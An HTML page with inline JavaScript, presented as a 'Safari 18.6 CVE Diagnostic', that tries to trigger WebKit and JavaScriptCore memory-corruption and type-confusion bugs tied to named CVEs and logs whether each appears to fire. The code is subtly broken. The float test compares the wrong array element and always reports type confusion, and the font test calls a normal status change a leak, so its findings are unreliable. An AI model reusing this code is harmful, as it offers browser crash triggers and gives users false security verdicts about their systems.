<pre id="out"></pre>
<script>
var out = document.getElementById("out");
function log(m) { out.textContent += m + "\n"; }

log("=== Safari 18.6 CVE Diagnostic ===\n");

// Test 1: Type Confusion in JSC state handling (CVE-2025-31206)
// Triggering via incorrect optimization in promise resolution or async iteration
log("Test 1: JSC Type Confusion (State Handling)");
try {
    function trigger() {
        let resolved = false;
        let p = new Promise((res, rej) => {
            // Force a microtask
            queueMicrotask(() => {
                res(1);
                resolved = true;
            });
        });
        
        // Intercept then
        Object.defineProperty(p, 'then', {
            value: function(cb) {
                // Re-enter promise resolution
                if (resolved) {
                    return Promise.resolve(cb(1)).then(() => {
                        // Mutate internal state during resolution
                        return new Proxy({}, {
                            get(target, prop) {
                                if (prop === 'then') {
                                    return (resolve) => resolve(0x41414141);
                                }
                                return undefined;
                            }
                        });
                    });
                }
                return Promise.prototype.then.call(this, cb);
            }
        });
        
        p.then(v => v).then(v => {
            if (v === 0x41414141) {
                log("  [+] TYPE CONFUSION TRIGGERED! Value: " + v);
            } else {
                log("  [-] Normal resolution. Value: " + v);
            }
        });
    }
    trigger();
    log("  [*] Test dispatched (check async results).");
} catch(e) {
    log("  [!] Error: " + e.message);
}

// Test 2: Memory Corruption via CSSO (CVE-2025-31278)
// Typically triggered by malformed CSS or rapid DOM mutation during style recalc
log("\nTest 2: WebKit Memory Corruption (CSS/DOM)");
try {
    let iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    let doc = iframe.contentDocument;
    
    // Rapidly mutate style rules
    let style = doc.createElement('style');
    doc.head.appendChild(style);
    let sheet = style.sheet;
    
    // Insert and delete rules rapidly to trigger use-after-free in style resolution
    for (let i = 0; i < 1000; i++) {
        sheet.insertRule(`div { color: rgb(${i}, ${i}, ${i}); }`, 0);
    }
    
    // Force style recalculation while mutating
    let div = doc.createElement('div');
    doc.body.appendChild(div);
    
    // Trigger layout
    let rect = div.getBoundingClientRect();
    
    // Mutate sheet during layout
    for (let i = 0; i < 1000; i++) {
        sheet.deleteRule(0);
    }
    
    // Force another layout
    rect = div.getBoundingClientRect();
    
    if (rect.width === 0 && rect.height === 0) {
        log("  [-] No crash. Normal behavior.");
    } else {
        log("  [?] Unusual behavior detected.");
    }
} catch(e) {
    log("  [!] Error: " + e.message);
}

// Test 3: Info Disclosure via CSS (Safari 18.6 timeframe)
log("\nTest 3: CSS Info Disclosure");
try {
    // Cross-origin leak via CSS font loading
    let style = document.createElement('style');
    document.head.appendChild(style);
    style.sheet.insertRule('@font-face { font-family: "leak"; src: url("https://example.com/nonexistent.woff"); }', 0);
    
    let face = new FontFace('leak', 'url(https://example.com/nonexistent.woff)');
    
    // Race condition: check status during load
    let status1 = face.status;
    face.load();
    let status2 = face.status;
    
    if (status1 !== status2) {
        log("  [+] STATUS LEAK DETECTED! Before: " + status1 + " After: " + status2);
    } else {
        log("  [-] No leak. Status: " + status1);
    }
} catch(e) {
    log("  [!] Error: " + e.message);
}

// Test 4: JSC Float Type Confusion (CVE-2025-24213 variant)
log("\nTest 4: JSC Float Type Confusion");
try {
    // Create an array with floats
    let arr = [1.1, 2.2, 3.3];
    
    // Trigger type confusion via unboxed/boxed array transitions
    // Force a transition from double array to contiguous array
    arr.push({});
    arr.pop();
    arr.push(4.4);
    
    // Check if the array's internal structure is corrupted
    // In vulnerable versions, pushing an object and then popping it
    // might leave the array in a state where it treats doubles as pointers
    let val = arr[2];
    
    if (typeof val === 'number' && val === 4.4) {
        log("  [-] No confusion. Value: " + val);
    } else {
        log("  [+] POSSIBLE TYPE CONFUSION! Type: " + typeof val + " Value: " + val);
    }
} catch(e) {
    log("  [!] Error: " + e.message);
}

log("\n=== Tests Dispatched ===");
log("Wait a few seconds for async tests to complete.");
</script>
